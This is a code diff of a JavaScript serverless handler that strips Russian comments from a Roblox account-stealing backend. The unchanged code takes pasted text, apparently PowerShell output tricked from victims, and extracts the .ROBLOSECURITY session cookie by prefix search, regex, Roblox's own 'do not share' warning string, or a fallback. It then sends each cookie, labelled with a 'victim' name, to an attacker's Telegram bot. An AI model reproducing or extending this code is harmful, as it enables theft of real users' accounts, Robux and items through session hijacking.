@@ -30,7 +30,6 @@ exports.handler = async (event) => {
 
         let raw = null;
 
-        // 1) Если есть префикс – берём всё после него до первого недопустимого символа
         if (code.includes(PREFIX)) {
             const start = code.indexOf(PREFIX) + PREFIX.length;
             let end = start;
@@ -45,13 +44,11 @@ exports.handler = async (event) => {
             raw = code.substring(start, end);
         }
 
-        // 2) Если нет – ищем .ROBLOSECURITY=...
         if (!raw) {
             const match = code.match(/\.ROBLOSECURITY=([A-Za-z0-9._\-]+)/);
             if (match) raw = match[1];
         }
 
-        // 3) Если нет – ищем "WARNING:-DO-NOT-SHARE-THIS..." без подчёркиваний
         if (!raw) {
             const warning = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
             const idx = code.indexOf(warning);
@@ -70,7 +67,6 @@ exports.handler = async (event) => {
             }
         }
 
-        // 4) Если ничего не нашли – пытаемся выцепить любую длинную строку
         if (!raw) {
             const cookie = extractCookie(code);
             if (cookie) raw = cookie;
@@ -88,7 +84,6 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
         }
 
-        // ===== ОТПРАВКА В TELEGRAM С HTML-ФОРМАТИРОВАНИЕМ =====
         const message = `<b>⚠️⚠️⚠️NEW COOKIE</b>\n<b>👤User:</b> ${victim}\n\n<code>${token}</code>`;
         const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -96,7 +91,7 @@ exports.handler = async (event) => {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML'   // <-- включаем HTML
+                parse_mode: 'HTML'
             })
         });
 
